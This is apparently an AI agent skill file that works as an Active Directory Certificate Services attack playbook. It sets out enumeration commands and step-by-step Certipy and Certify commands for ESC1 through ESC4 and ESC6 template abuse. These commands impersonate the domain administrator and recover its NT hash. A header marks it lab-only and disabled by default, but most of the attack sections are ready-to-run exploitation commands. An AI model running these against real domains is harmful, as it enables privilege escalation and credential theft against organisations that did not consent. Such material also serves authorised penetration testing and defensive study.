---
name: active-directory-certificate-services
description: >-
  AD Certificate Services attack playbook. Use when targeting misconfigured AD CS for privilege escalation via ESC1-ESC13 template abuse, NTLM relay to enrollment, CA officer abuse, and certificate-based persistence.
---

# SKILL: AD CS Attack Playbook — Expert Guide

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert AD CS (Active Directory Certificate Services) attack techniques. Covers ESC1 through ESC13, certificate-based persistence, NTLM relay to enrollment endpoints, and CA misconfigurations. Pay particular attention to enrollment prerequisite chains and ESC condition combinations.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `active-directory-acl-abuse` for ACL-based attacks that enable ESC4 (template modification)
- `active-directory-kerberos-attacks` for Kerberos techniques after obtaining certificates
- `ntlm-relay-coercion` for ESC8 (relay to HTTP enrollment endpoint)
- `windows-lateral-movement` for using obtained certificates for lateral movement

### Advanced Reference

Also inspect [ADCS_ESC_MATRIX.md](./ADCS_ESC_MATRIX.md) when you need:
- ESC1–ESC13 quick reference table with conditions, impact, and tool commands
- One-liner exploitation commands per ESC variant
- Detection indicators per technique

---

## 1. AD CS ARCHITECTURE OVERVIEW

```
Certificate Authority (CA)
│
├── Enterprise CA (AD-integrated, issues certs based on templates)
│   ├── Certificate Templates (define who can enroll, what EKUs, subject settings)
│   ├── Enrollment endpoints: HTTP (certsrv), RPC, DCOM
│   └── Published in AD: CN=Public Key Services,CN=Services,CN=Configuration
│
├── Template Key Settings:
│   ├── Subject Alternative Name (SAN): who the cert represents
│   ├── Extended Key Usage (EKU): what the cert allows
│   ├── Enrollment permissions: who can request
│   └── Issuance requirements: manager approval, authorized signatures
│
└── Certificate → Kerberos Auth Flow:
    User presents cert → PKINIT → KDC verifies → issues TGT
```

---

## 2. ENUMERATION

```bash
# Certipy (recommended — comprehensive)
certipy find -u user@domain.com -p password -dc-ip DC_IP -stdout
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable -stdout

# Certify (from Windows)
Certify.exe find
Certify.exe find /vulnerable
Certify.exe cas                    # Enumerate CAs

# Manual LDAP query for templates
ldapsearch -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
```

---

## 3. ESC1 — ENROLLEE SUPPLIES SUBJECT

**Condition**: Template allows enrollee to specify Subject Alternative Name (SAN) + client authentication EKU + low-privilege enrollment.

```bash
# Certipy
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# Certify (Windows)
Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → NT hash of administrator
```

---

## 4. ESC2 — ANY PURPOSE EKU

**Condition**: Template has "Any Purpose" EKU or no EKU (subordinate CA cert) + low-privilege enrollment.

```bash
# Same as ESC1 exploitation
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template AnyPurposeTemplate -upn administrator@domain.com
```

---

## 5. ESC3 — ENROLLMENT AGENT

**Condition**: Template allows enrollment agent certificate + another template allows enrollment on behalf of others.

```bash
# Step 1: Request enrollment agent cert
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template EnrollmentAgent

# Step 2: Use enrollment agent cert to request on behalf of admin
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template UserTemplate -on-behalf-of 'DOMAIN\administrator' -pfx enrollmentagent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## 6. ESC4 — TEMPLATE ACL MISCONFIGURATION

**Condition**: Low-privilege user has write access to certificate template object.

```bash
# Modify template to become ESC1 vulnerable
# Using Certipy:
certipy template -u user@domain.com -p password -template VulnTemplate \
  -save-old -dc-ip DC_IP

# Template is now ESC1 → exploit as ESC1
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# Restore original template (cleanup)
certipy template -u user@domain.com -p password -template VulnTemplate \
  -configuration old_config.json -dc-ip DC_IP
```

---

## 7. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled → any template becomes ESC1.

```bash
# Check if flag is set
certutil -config "CA_HOST\CA-NAME" -getreg policy\EditFlags

# Exploit: request any template with SAN
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template User -upn administrator@domain.com
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 8. ESC7 — CA OFFICER / MANAGER PERMISSIONS
- 9. ESC8 — NTLM RELAY TO HTTP ENROLLMENT
- 10. ESC9-ESC13 — NEWER DISCOVERIES
- 11. CERTIFICATE-BASED PERSISTENCE
- 12. AD CS ATTACK DECISION TREE
